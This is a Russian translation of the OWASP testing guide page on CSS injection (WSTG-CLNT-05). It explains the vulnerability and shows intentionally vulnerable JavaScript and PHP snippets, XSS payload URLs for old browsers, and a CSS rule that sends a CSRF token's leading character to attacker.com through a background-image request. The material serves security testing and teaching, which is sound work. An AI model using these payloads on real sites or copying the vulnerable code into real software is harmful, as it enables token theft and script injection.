---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование CSS-инъекций

|ID          |
|------------|
|WSTG-CLNT-05|

## Обзор

Уязвимость инъекции [CSS](https://ru.wikipedia.org/wiki/CSS) включает в себя возможность вводить произвольный код CSS в контексте доверенного web-сайта, который отображается в браузере жертвы. Воздействие этого типа уязвимости зависит от поставляемой CSS полезной нагрузки. Оно может привести к XSS или раскрытию чувствительной информации.

Эта уязвимость возникает, когда приложение позволяет предоставляемому пользователем CSS вмешиваться в имеющиеся таблицы стилей приложения. Инъекция кода в контексте CSS может предоставить злоумышленнику возможность при определённых условиях выполнять JavaScript или извлекать чувствительные данные с помощью селекторов CSS и функций, способных формировать HTTP-запросы. Как правило, предоставление пользователям возможности настраивать страницы с помощью своих CSS-файлов сопряжено со значительным риском.

В следующем коде JavaScript показан возможный уязвимый скрипт, в котором злоумышленник может контролировать `location.hash` ([источник](https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources)), который ведёт к функции `cssText` ([приёмник](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)). Этот пример может привести к XSS на основе DOM в старых версиях браузеров. Дополнительную информацию см. в [Памятке по предотвращению XSS на основе DOM](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

Злоумышленник может нацелиться на жертву, попросив ее посетить следующие URL-адреса:

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

Такая же уязвимость может появиться и в случае отражённого XSS, например, в следующем коде на PHP:

```php
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Дальнейшие сценарии атак предполагают возможность извлечения данных с помощью принятия чистых CSS-правил. Такие атаки могут проводиться через CSS-селекторы, что приводит к утечке данных, например, CSRF-токенов.

Вот пример кода, который пытается выбрать ввод с `name` совпадающим с `csrf_token` и `value`, начинающимся на `a`. Используя атаку методом перебора для определения `value` атрибута, можно провести атаку, которая передаёт значение домену злоумышленника, например, пытаясь установить фоновое изображение на выбранном элементе ввода.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
```

Другие атаки с использованием запрошенного контента, такого как CSS, освещаются в видеоролике [Mario Heiderich "Got Your Nose"](https://www.youtube.com/watch?v=FIQvAaZj_HA).

## Задачи тестирования

- Найти точки инъекции CSS.
- Оценить воздействие инъекции.

## Как тестировать

Необходимо проанализировать код, чтобы определить, разрешено ли пользователю вводить контент в контексте CSS. В частности, следует изучить способ, которым web-сайт выдаёт правила CSS на основе входных данных.

Ниже приведен базовый пример:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

Вышеприведенный код содержит источник `location.hash`, контролируемый злоумышленником, который может вставляться непосредственно в атрибут `style` HTML-элемента. Как упоминалось выше, это может привести к разным результатам в зависимости от используемого браузера и предоставленной полезной нагрузки.

На следующих страницах приведены примеры уязвимостей, связанных с CSS-инъекциями:

- [Password "cracker" via CSS and HTML5](http://html5sec.org/invalid/?length=25)
- [CSS attribute reading](http://eaea.sirdarckcat.net/cssar/v2/)
- [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

Дополнительные ресурсы OWASP по предотвращению инъекций CSS см. в [Памятке по защите каскадных таблиц стилей](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
